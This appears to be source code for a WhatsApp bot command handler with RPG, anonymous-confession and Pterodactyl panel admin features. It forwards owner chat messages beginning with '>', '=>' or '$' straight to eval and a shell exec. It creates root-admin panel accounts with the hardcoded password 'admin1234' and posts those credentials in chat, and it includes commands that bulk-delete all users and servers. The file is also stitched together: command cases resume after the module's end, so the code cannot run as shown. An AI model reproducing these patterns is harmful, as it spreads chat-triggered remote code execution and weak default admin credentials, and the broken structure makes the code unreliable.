				text += `- 🪨 Coal: ${db.data.rpg[users].coal} Piece(s)\n\n`;

				text += `🐾 *Animals & Livestock*\n`;
				text += `- 🐔 Chicken: ${db.data.rpg[users].chicken} Animal(s)\n`;
				text += `- 🐄 Cow: ${db.data.rpg[users].cow} Animal(s)\n`;
				text += `- 🐑 Sheep: ${db.data.rpg[users].sheep} Animal(s)\n`;
				text += `- 🐟 Fish: ${db.data.rpg[users].fish} Animal(s)\n\n`;

				text += `🔥 *Keep up the hunting & adventure spirit! Don't forget to upgrade your equipment! 🚀*`;

				await sock.sendMessage(m.chat, {
					image: imageBuffer,
					caption: text,
					contextInfo: {
						mentionedJid: [users],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: channel,
							serverMessageId: null,
							newsletterName: channelName
						},
						externalAdReply: {
							title: "RPG-GAME (Inventory)",
							body: "Explore the world and upgrade your equipment! ⚒️",
							thumbnailUrl: "https://telegra.ph/file/675903e8c4a42e1dd990b.jpg",
							sourceUrl: wagc,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { quoted: m });
			}
			break;

			default:
			if (budy.startsWith('=>')) {
				if (!isCreator) return m.react('⚠️');
				if (isBot) return m.react('⚠️');
				await m.react('⏱️');
				function Return(sul) {
					sat = JSON.stringify(sul, null, 2)
					bang = util.format(sat)
					if (sat == undefined) {
						bang = util.format(sul)
					}
					m.react('✅');
					return newReply(bang)
				}
				try {
					newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
				} catch (e) {
					newReply(String(e))
				}
			};

			if (budy.startsWith('>')) {
				if (!isCreator) return m.react('⚠️');
				if (isBot) return m.react('⚠️');
				try {
					await m.react('⏱️');
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					m.react('✅');
					await newReply(evaled)
				} catch (err) {
					await newReply(String(err))
				}
			};

			if (budy.startsWith('$')) {
				if (!isCreator) return m.react('⚠️');
				if (isBot) return m.react('⚠️');
				await m.react('⏱️');
				exec(budy.slice(2), (err, stdout) => {
					m.react('✅');
					if (err) return newReply(err)
					if (stdout) return newReply(stdout)
				})
			};

			if (isCmd && budy.toLowerCase() != undefined) {
				if (m.chat.endsWith('broadcast')) return
				if (m.isBaileys) return
				let msgs = db.data.database
				if (!(budy.toLowerCase() in msgs)) return
				sock.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
			}

			if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
				try {
					this.menfes = this.menfes || {};
					let room = Object.values(this.menfes).find(room => 
						[room.a, room.b].includes(m.sender) && room.state === 'CHATTING'
					);
					if (room) {
						if (/^.*(next|leave|start)/.test(m.text)) return;
						if (['.next', '.leave', '.stop', '.start', 'Find Partner', 'Exit', 'Continue', 'Stop'].includes(m.text)) return;
						let find = Object.values(this.menfes).find(menpes => 
							[menpes.a, menpes.b].includes(m.sender)
						);
						let other = find.a === m.sender ? find.b : find.a;
						if (m.mtype === 'conversation' || m.mtype === 'extendedTextMessage') {
							await sock.sendMessage(other, {
								text: m.text,
								mentions: [other]
							}, { 
								quoted: fmen 
							});
						}
						if (['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'].includes(m.mtype)) {
							let media;
							try {
								media = await m.download();
							} catch (err) {
								console.error('Failed to download media:', err);
								await sock.sendMessage(m.sender, { text: 'Failed to download media. Make sure the media is still valid and try again.' });
								return;
							}
							let options = {
								caption: m.msg?.caption || '',
								mentions: [other]
							};
							if (m.mtype === 'imageMessage') {
								await sock.sendMessage(other, { image: media, ...options });
							} 
							else if (m.mtype === 'videoMessage') {
								await sock.sendMessage(other, { video: media, ...options });
							} 
							else if (m.mtype === 'audioMessage') {
								await sock.sendMessage(other, { audio: media, mimetype: 'audio/mpeg', ...options });
							} 
							else if (m.mtype === 'documentMessage') {
								await sock.sendMessage(other, { document: media, mimetype: m.msg?.mimetype, fileName: m.msg?.fileName, ...options });
							} 
							else if (m.mtype === 'stickerMessage') {
								await sock.sendMessage(other, { sticker: media });
							} 
							else {
								console.warn('Media type not recognized:', m.mtype);
							}
						}
					}
				} catch (err) {
					console.error('Error in Menfess feature:', err);
					await sock.sendMessage(m.sender, { text: 'An error occurred while sending message to Menfess partner. Please try again later.' });
				}
			}
		}
	} catch (err) {
		console.log(chalk.yellow.bold("[ ERROR ] case.js :\n") + chalk.redBright(util.format(err)));
	}
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
case 'me': 
case 'account': { 
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
let userData = db.data.users[m.sender];
let replyText = '';
replyText += `*📋 User Information*\n`;
replyText += `- *Number*: ${usernomor}\n`;
replyText += `- *Name*: ${userData.name || 'Not set'}\n`;
replyText += `- *Age*: ${userData.age || 'Not set'}\n`;
replyText += `- *City of Origin*: ${userData.originCity || 'Not set'}\n`;
replyText += `- *Level*: ${userData.level || 0}\n`;
replyText += `- *Exp*: ${userData.exp || 0}\n`;
replyText += `- *Coins*: ${userData.coins || 0}\n`;
replyText += `- *Premium Status*: ${userData.premium ? 'Yes' : 'No'}\n`;
replyText += `- *VIP Status*: ${userData.vip ? 'Yes' : 'No'}\n`;
replyText += `- *Rank*: ${userData.rank || 'None'}\n`;
replyText += `- *Partner*: ${userData.partner ? '@' + userData.partner.replace('@s.whatsapp.net', '') : 'None'}\n`;
replyText += `- *Title*: ${userData.title || 'None'}`;
let button = [{
"name": "single_select",
"buttonParamsJson": `{
"title": "Buy Limit",
"sections": [
{
"title": "Limit 1 - 1000",
"rows": [
{
"header": "Buy Limit 🟣",
"title": "1 Limit - Rp. 500",
"id": "${prefix}buy limit 1"
},
{
"header": "Buy Limit 🟠",
"title": "50 Limit - Rp. 25.000",
"id": "${prefix}buy limit 50"
},
{
"header": "Buy Limit 🟢",
"title": "100 Limit - Rp. 50.000",
"id": "${prefix}buy limit 100"
},
{
"header": "Buy Limit 🔴",
"title": "500 Limit - Rp. 250.000",
"id": "${prefix}buy limit 500"
},
{
"header": "Buy Limit 🟡",
"title": "1000 Limit - Rp. 500.000",
"id": "${prefix}buy limit 1000"
}
]
}
]
}`
}]

sock.sendButtonText(m.chat, button, replyText, footer, m)
}; 
break; 

case 'checkuser': 
case 'userinfo': {
if (!isCreator) return newReply(mess.owner);
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
let replyText = '';
if (!args[0]) {
replyText += 'You need to enter the phone number of the user you want to check! 😊\n\n';
replyText += '*Example:*\n';
replyText += `${prefix + command} 6281234567890`;
return newReply(replyText);
}
let targetNumber = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (!db.data.users[targetNumber]) {
replyText += `Number *${args[0]}* is not registered in the database, sis/bro. 😊`;
return newReply(replyText);
}
let userData = db.data.users[targetNumber];
replyText += `*📋 User Information*\n`;
replyText += `- *Number*: ${args[0]}\n`;
replyText += `- *Name*: ${userData.name || 'Not set'}\n`;
replyText += `- *Age*: ${userData.age || 'Not set'}\n`;
replyText += `- *City of Origin*: ${userData.originCity || 'Not set'}\n`;
replyText += `- *Level*: ${userData.level || 0}\n`;
replyText += `- *Exp*: ${userData.exp || 0}\n`;
replyText += `- *Coins*: ${userData.coins || 0}\n`;
replyText += `- *Premium Status*: ${userData.premium ? 'Yes' : 'No'}\n`;
replyText += `- *VIP Status*: ${userData.vip ? 'Yes' : 'No'}\n`;
replyText += `- *Rank*: ${userData.rank || 'None'}\n`;
replyText += `- *Partner*: ${userData.partner || 'None'}\n`;
replyText += `- *Title*: ${userData.title || 'None'}\n`;
return newReply(replyText);
}
break

case 'limit': 
case 'checklimit': { 
if (!db.data.users[m.sender]) return newReply('⚠️ User data not found in database!');
let a = db.data.users[m.sender]; 
let txt = `*📊 LIMIT INFORMATION 📊*\n\n`; 
txt += `- *Remaining Limit*: ${formatNumber(a.limit)}\n`; 
txt += `- *Total Limit*: ${formatNumber(a.totalLimit)}\n`; 
txt += `*Use your limit wisely!* 💼`; 
await sock.sendMessage(m.chat, { 
text: txt 
}, { 
quoted: m 
}); 
}; 
break;

case 'confess': 
case 'anonymous': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
this.confess = this.confess || {};
let session = Object.values(this.confess).find(confess => [confess.a, confess.b].includes(m.sender));
if (session) return newReply(`Uhh... You're still in a previous ${command} session, please finish it first before starting a new one! 🤭`);
if (m.isGroup) return newReply(`Sorry sis/bro, this feature can only be used in private chat! 😅`);
if (!text || !text.includes('|')) {
return newReply(`You can use this format: ${prefix + command} name|number|message\n\nExample:\n${prefix + command} ${pushname}|${m.sender.split('@')[0]}|Hello, how are you? 👋`);
}
let [theirName, theirNumber, theirMessage] = text.split('|');
if (!theirNumber || !theirMessage) {
return newReply(`Uh-oh, wrong format! Make sure to use the name|number|message format, sis/bro! 😄`);
}
if (theirNumber.startsWith('0') || isNaN(theirNumber)) {
return newReply(`Invalid number, sis/bro! Use international format without the leading '0'! 🙏`);
}
await m.react('⏱️');
let messageTemplate = `\nHey sis/bro, there's a confession here 😊✨\n\n👤 *From*: ${theirName}\n✉️ *Message*: ${theirMessage}\n\n_This message is only delivered by the bot, sis/bro! 🤖_`;
let id = m.sender;
this.confess[id] = {
id,
a: m.sender,
b: theirNumber + '@s.whatsapp.net',
state: 'WAITING'
};
const buttons = [
{
"name": "single_select",
"buttonParamsJson": `{
"title": "Click Here ⎙",
"sections": [
{
"title": "💌 Accept or Reject Confession",
"rows": [
{
"header": "🤗 Accept Confession",
"title": "🌟 Yes, Accept Confession",
"description": "Click this if you want to accept and process this confession nicely! 🥰",
"id": "${prefix}replyconfess"
},
{
"header": "😔 Reject Confession",
"title": "❌ No, Reject Confession",
"description": "Click this if you don't want to accept this confession. 😢",
"id": "${prefix}rejectconfess"
}
]
}
]
}`
}
];
sock.sendButtonText(`${theirNumber}@s.whatsapp.net`, buttons, messageTemplate, footer, fmen);
newReply(`Yay! Confession message successfully sent to ${theirNumber}. Now just wait for the response, sis/bro. If there's no reply within 24 hours, don't wait any longer! 🤭`);
}
db.data.users[m.sender].limit -= 1;
break;

case 'replyconfess': 
case 'replyconfession': {
let session = Object.values(this.confess).find(confess => [confess.a, confess.b].includes(m.sender));
if (!session) return newReply('Hmmm, it seems you don\'t have an active confession session. 😅');
let room = Object.values(this.confess).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return newReply('No confession session waiting for your reply. 😢');
let otherUser = [room.a, room.b].find(user => user !== m.sender);
room.state = 'CHATTING';
this.confess[room.id] = { ...room };
await sock.sendMessage(otherUser, { 
text: `_@${m.sender.split('@')[0]} has accepted your confession, now you can chat through this bot!_\n\n*Note*: If you want to stop, just type .stopconfess. 😉`, 
mentions: [m.sender] 
});
sock.sendMessage(m.chat, { 
text: `😊🎉 _Confession has been accepted, now you can chat through this bot!_\n\n*Note*: If you want to stop, just type .stopconfess. 🤗` 
});
}
break;

case 'rejectconfess': 
case 'rejectconfession': {
let session = Object.values(this.confess).find(confess => [confess.a, confess.b].includes(m.sender));
if (!session) return newReply('Hmm, you\'re not in any confession session at the moment. 😕');
let room = Object.values(this.confess).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return newReply('No confession session to reject at the moment, sis/bro! 😅');
let otherUser = [room.a, room.b].find(user => user !== m.sender);
await sock.sendMessage(otherUser, { 
text: `_Oops... @${m.sender.split('@')[0]} has rejected your confession. It\'s okay, stay positive! 🤗_`, 
mentions: [m.sender] 
});
newReply('Confession successfully rejected. If there are others, don\'t hesitate to try again, sis/bro! ✋');
delete this.confess[room.id];
}
break;

case 'stopconfess': 
case 'stopconfession': {
let session = Object.values(this.confess).find(confess => [confess.a, confess.b].includes(m.sender));
if (!session) return newReply('Seems like you don\'t have an active confession session at the moment. 😅');
let otherUser = session.a === m.sender ? session.b : session.a;
await sock.sendMessage(otherUser, { 
text: `_Your chat partner has ended this confession session, sis/bro. Thanks for trying this feature! 😊_`, 
mentions: [m.sender] 
});
newReply('Confession session has been ended. If you want to start again, just use the same command, sis/bro! 😄');
delete this.confess[session.id];
}
break;

case 'addadminuser': {
if (!isCreator) return newReply(mess.owner);
let inputParams = q.split(',');
if (inputParams.length < 3) {
return newReply(`*Wrong format!*\n\n*Usage:*\n${prefix + command} email,username,name,number/tag`);
}

let emailAddress = inputParams[0].trim().toLowerCase();
let userName = inputParams[1].trim();
let fullName = inputParams[2].trim();
let defaultPassword = 'admin1234'.toLowerCase(); // Password changed to lowercase

try {
let data = await fetch(`${panel}/api/application/users`, {
method: "POST",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apiuser}`
},
body: JSON.stringify({
email: emailAddress,
username: userName,
first_name: fullName,
last_name: "Admin",
root_admin: true,
language: "en",
password: defaultPassword
})
});

let responseData = await data.json();
if (responseData.errors) {
return newReply(`❌ *An error occurred:*\n\`${JSON.stringify(responseData.errors[0], null, 2)}\``);
}

let newUser = responseData.attributes;
let responseText = `*👑 NEW ADMIN ADDED 👑*\n\n`;
responseText += `🆔 *ID*: ${newUser.id}\n`;
responseText += `👤 *Username*: ${newUser.username}\n`;
responseText += `📧 *Email*: ${newUser.email}\n`;
responseText += `📝 *Name*: ${newUser.first_name} ${newUser.last_name}\n`;
responseText += `🌐 *Language*: ${newUser.language}\n`;
responseText += `🛡️ *Admin*: ${newUser.root_admin ? 'Yes' : 'No'}\n`;
responseText += `📅 *Created at*: ${newUser.created_at}`;

await newReply(responseText);

let loginText = `*🔑 ADMIN LOGIN DETAILS 🔑*\n\n`;
loginText += `📧 *Email*: ${emailAddress}\n`;
loginText += `📝 *Username*: ${userName}\n`;
loginText += `🔑 *Password*: ${defaultPassword}\n`;
loginText += `🌐 *Panel Login*: ${panel}\n`;

await newReply(loginText);

} catch (error) {
console.error(error);
newReply(`❌ *An error occurred:*\n\`${error.message}\``);
}
}
break;

case 'listusers': {
if (!isCreator) return newReply(mess.owner);
let page = args[0] || '1';

try {
let data = await fetchJson(`${panel}/api/application/users?page=${page}`, {
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apiuser}`
}
});

let users = data.data;
let totalUsers = users.length;
let batchSize = 40;
let totalBatches = Math.ceil(totalUsers / batchSize);

if (totalUsers === 0) return newReply('⚠️ No users found.');

for (let i = 0; i < totalBatches; i++) {
let responseText = `📋 *Panel User List* 📋\n\n`;
let batch = users.slice(i * batchSize, (i + 1) * batchSize);

for (let user of batch) {
responseText += `🆔 *ID*: ${user.attributes.id}\n`;
responseText += `👤 *Name*: ${user.attributes.first_name} ${user.attributes.last_name}\n`;
responseText += `📝 *Username*: ${user.attributes.username}\n`;
responseText += `📧 *Email*: ${user.attributes.email.toLowerCase()}\n`;
responseText += `🛡️ *Admin*: ${user.attributes.root_admin ? 'Yes' : 'No'}\n`;
responseText += `🔒 *2FA*: ${user.attributes["2fa"] ? 'Active' : 'Inactive'}\n\n`;
}

responseText += `📑 *Page*: ${data.meta.pagination.current_page}/${data.meta.pagination.total_pages}\n`;
responseText += `📊 *Total Users*: ${data.meta.pagination.total}\n`;
responseText += `📦 *Users per Page*: ${data.meta.pagination.per_page}\n`;

await newReply(responseText);
}
} catch (error) {
console.error(error);
newReply(`❌ *An error occurred*: ${error.message}`);
}
}
break;

case 'listservers': {
if (!isCreator) return newReply(mess.owner);
let page = args[0] || '1';

try {
let data = await fetchJson(`${panel}/api/application/servers?page=${page}`, {
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apiuser}`
}
});

let servers = data.data;
let totalServers = servers.length;
let batchSize = 40;
let totalBatches = Math.ceil(totalServers / batchSize);

if (totalServers === 0) return newReply('⚠️ No servers found.');

for (let i = 0; i < totalBatches; i++) {
let responseText = `📋 *Panel Server List* 📋\n\n`;
let batch = servers.slice(i * batchSize, (i + 1) * batchSize);

for (let server of batch) {
responseText += `🖥️ *Server Info*\n`;
responseText += `🆔 *ID*: ${server.attributes.id}\n`;
responseText += `🔑 *Identifier*: ${server.attributes.identifier}\n`;
responseText += `📛 *Name*: ${server.attributes.name}\n`;
responseText += `📝 *Description*: ${server.attributes.description || 'No description'}\n`;
responseText += `🚫 *Suspended*: ${server.attributes.suspended ? 'Yes' : 'No'}\n\n`;
responseText += `💾 *Storage Info*\n`;
responseText += `🧠 *Memory*: ${server.attributes.limits.memory == 0 ? "Unlimited" : (server.attributes.limits.memory / 1000) + " GB"}\n`;
responseText += `📀 *Disk*: ${server.attributes.limits.disk == 0 ? "Unlimited" : (server.attributes.limits.disk / 1000) + " GB"}\n`;
responseText += `⚙️ *CPU*: ${server.attributes.limits.cpu == 0 ? "Unlimited" : server.attributes.limits.cpu + "%"}\n\n`;
}

responseText += `📑 *Page*: ${data.meta.pagination.current_page}/${data.meta.pagination.total_pages}\n`;
responseText += `📊 *Total Servers*: ${data.meta.pagination.total}\n`;
responseText += `📦 *Servers per Page*: ${data.meta.pagination.per_page}\n`;

await newReply(responseText);
}
} catch (error) {
console.error(error);
newReply(`❌ *An error occurred*: ${error.message}`);
}
}
break;

case 'adduser': {
if (!isCreator) return newReply(mess.owner);
let input = text.split(",");
let email = input[0]?.trim().toLowerCase();
let username = input[1]?.trim();
let password = input[2]?.trim();

if (!email || !username || !password || (!input[3])) {
return newReply(`⚠️ *Invalid input!*\n\nPlease enter the correct *${!email ? "email" : !username ? "username" : !password ? "password" : "recipient"}*.\n\n📌 *Format*: \n\`${prefix + command} email,username,password,@tag\`\n\n🔹 *Example*: \n\`${prefix + command} bot@user.com,bot,bot123,@0\``);
}

try {
const userData = await createUser(email, username, password);

if (userData.errors) {
return newReply(`❌ *An error occurred:* \n\`${JSON.stringify(userData.errors[0], null, 2)}\``);
}

let responseText = `📋 *New User Added* 📋\n\n`;
responseText += `🆔 *ID*: ${userData.attributes.id}\n`;
responseText += `👤 *Username*: ${userData.attributes.username}\n`;
responseText += `📧 *Email*: ${userData.attributes.email.toLowerCase()}\n`;
responseText += `👑 *Admin*: ${userData.attributes.root_admin ? 'Yes' : 'No'}\n`;

await newReply(responseText);

let loginText = `📋 *User Login Information* 📋\n\n`;
loginText += `📧 *Email*: ${email}\n`;
loginText += `👤 *Username*: ${username}\n`;
loginText += `🔑 *Password*: ${password}\n`;
loginText += `🔗 *Login*: ${panel}\n`;

await newReply(loginText);
} catch (error) {
console.error(error);
newReply(`❌ *An error occurred*: ${error.message}`);
}
}
break;

case 'addserver': {
if (!isCreator) return newReply(mess.owner);
let input = text.split(",");
let name = input[0]?.trim();
let userid = input[1]?.trim();
let memo = input[2]?.trim();
let disk = input[3]?.trim();
let cpu = input[4]?.trim();

if (!name || !userid || !memo || !disk || !cpu) {
return newReply(`⚠️ *Invalid input!* \n\nPlease enter the correct *${!name ? "name" : !userid ? "user ID" : !memo ? "memory capacity" : !disk ? "disk capacity" : "CPU"}*.\n\n📌 *Format*: \n\`${prefix + command} name,userid,memo,disk,cpu\`\n\n🔹 *Example*: \n\`${prefix + command} bot,6,1200,1200,100\``);
}

if (isNaN(userid) || isNaN(memo) || isNaN(disk) || isNaN(cpu)) {
return newReply(`⚠️ *Input must be numbers!* \n\nThe *${isNaN(userid) ? "user ID" : isNaN(memo) ? "Memory" : isNaN(disk) ? "Disk" : "CPU"}* part must be filled with numbers.\n\n📌 *Format*: \n\`${prefix + command} name,userid,memo,disk,cpu\`\n\n🔹 *Example*: \n\`${prefix + command} bot,6,1200,1200,100\``);
}

try {
const eggData = await getEggStartupCommand();
const startup_cmd = eggData.attributes.startup;
let data = await createServer(name, userid, startup_cmd, memo, cpu, disk);

if (data.errors) {
return newReply(`❌ *An error occurred:*\n\`${JSON.stringify(data.errors[0], null, 2)}\``);
}

let responseText = `🎊 *New server successfully added!* ✅\n\n`;
responseText += `💻 *Server Information*:\n`;
responseText += `🆔 *ID*: ${data.attributes.id}\n`;
responseText += `🔑 *Identifier*: ${data.attributes.identifier}\n`;
responseText += `📛 *Name*: ${data.attributes.name}\n`;
responseText += `💾 *Memory*: ${data.attributes.limits.memory} MB\n`;
responseText += `📦 *Disk*: ${data.attributes.limits.disk} MB\n`;
responseText += `⚙️ *CPU*: ${data.attributes.limits.cpu}%\n`;

await newReply(responseText);
} catch (error) {
console.error(error);
newReply(`❌ *An error occurred:* \`${error.message}\``);
}
}
break;

case 'deleteserver': {
if (!isCreator) return newReply(mess.owner);
let srv = args[0];
if (!srv) return newReply('⚠️ Please provide the *Server ID* you want to delete.');

try {
let res = await deleteServer(srv);
if (res.errors) return newReply('⚠️ Server not found. Make sure the entered ID is correct.');

newReply('✅ Server successfully deleted from the system.');
} catch (error) {
console.error(error);
newReply('❌ Failed to delete server. If you are the owner, please check console.');
}
}
break;

case 'deleteallservers': {
if (!isCreator) return newReply(mess.owner);

await newReply(mess.wait);
try {
let response = await fetch(`${global.panel}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apiuser}`,
}
});

let data = await response.json();
if (!data || !data.data || data.data.length === 0) return newReply('⚠️ No servers found.');

let deletedCount = 0;
for (let srv of data.data) {
if (srv.attributes.id === 1) continue; // Skip server with ID 1
let res = await deleteServer(srv.attributes.id);
if (res.success) deletedCount++;
}

newReply(`✅ Successfully deleted ${deletedCount} servers from the system (except server with ID 1).`);
} catch (error) {
console.error(error);
newReply('❌ Failed to delete servers. If you are the owner, please check console.');
}
}
break;

case 'deleteuser': {
if (!isCreator) return newReply(mess.owner);
let usr = args[0];
if (!usr) return newReply('⚠️ Please provide the *User ID* you want to delete.');

try {
let res = await deleteUser(usr);
if (res.errors) return newReply('⚠️ User not found. Make sure the entered ID is correct.');

newReply(`✅ User with ID *${usr}* successfully deleted from the system.`);
} catch (error) {
console.error(error);
newReply('❌ Failed to delete user. If you are the owner, please check console.');
}
}
break;

case 'deleteallusers': {
if (!isCreator) return newReply(mess.owner);

await newReply(mess.wait);
try {
let response = await fetch(`${global.panel}/api/application/users`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apiuser}`,
}
});

let data = await response.json();
if (!data || !data.data || data.data.length === 0) return newReply('⚠️ No users found.');

let deletedCount = 0;
for (let usr of data.data) {
if (usr.attributes.id === 1) continue; // Skip user with ID 1
let res = await deleteUser(usr.attributes.id);
if (res.success) deletedCount++;
}

newReply(`✅ Successfully deleted ${deletedCount} users from the system (except user with ID 1).`);
} catch (error) {
console.error(error);
newReply('❌ Failed to delete users. If you are the owner, please check console.');
}
}
break;

case 'startserver':
case 'stopserver':
case 'restartserver': {
if (!isCreator) return newReply(mess.owner);
let action = command.replace('server', '');
let srv = args[0];

if (!srv) return newReply('⚠️ Please enter the *Server ID* you want to control.');

try {
let data = await manageServer(action, srv);
newReply(`✅ Server successfully *${action}*.`);
} catch (error) {
console.error(error);
newReply('❌ Failed to execute command. If you are the owner, please check console.');
}
}
break;